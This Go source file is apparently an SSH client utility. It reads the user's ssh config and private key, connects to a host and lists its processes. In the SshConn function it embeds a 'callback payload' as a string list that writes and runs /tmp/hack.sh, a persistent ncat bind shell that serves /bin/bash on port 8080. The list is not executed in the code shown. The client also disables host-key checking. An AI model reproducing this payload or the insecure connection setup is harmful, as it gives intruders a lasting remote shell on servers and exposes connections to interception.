package sshclient

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"

	"github.com/kevinburke/ssh_config"

	log "github.com/sirupsen/logrus"
	"golang.org/x/crypto/ssh"
)

type SshClient struct {
    Config *ssh_config.Config
}

func  NewSshClient(filePath string) *SshClient {
    if filePath == "" {
        filePath = filepath.Join(os.Getenv("HOME"), ".ssh", "config")
    }
    file, _ := os.Open(filePath) 
    config, _ := ssh_config.Decode(file)

    return &SshClient {
        Config: config,
    }
}

func (sc *SshClient) SshConn(host string) {
    if _, err := (sc.Config.Get(host, "HostName")); err != nil {
        log.Error("Host not found in ssh-config: " + host)
    }

    identitaFile, _ := sc.Config.Get(host, "IdentityFile")
    key, err := ioutil.ReadFile(identitaFile)
    if err != nil {
        log.Fatal(err)
    }

    signer, err := ssh.ParsePrivateKey(key)
    if err != nil {
        log.Fatal(err)
    }

    user, _ := sc.Config.Get(host, "User")
    config := &ssh.ClientConfig{
    	User:            user,
    	Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
    }

    hostName, _ := sc.Config.Get(host, "HostName")
    port, _ := sc.Config.Get(host, "Port")
    network := fmt.Sprintf("%s:%s", hostName, port)
    conn, err := ssh.Dial(
        "tcp",
        network,
        config,
    )
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    // Callback payload
    // Persists even when we kill the session
    _ = []string{
        "touch /tmp/hack.sh",
        "chmod +x /tmp/hack.sh",
        "echo '#!/bin/bash' > /tmp/hack.sh",
        "echo 'while true; do ncat -e /bin/bash -lp 8080; done &' >> /tmp/hack.sh",
        "/tmp/hack.sh",
    }

    cmds := []string{
        psCmd,
    }
    for _, cmd := range(cmds) {
        log.Infof(">> %s", cmd)
        session, err := conn.NewSession()
        if err != nil {
            log.Fatal(err)
        }
        defer session.Close()

        output, err := session.CombinedOutput(cmd)
        if err != nil {
            log.Fatal(err)
        }
        po := parsePsOutput(string(output))
        for _, proc := range(po.Procs) {
            log.Infof("%+v\n", proc) 
        }

    }
}

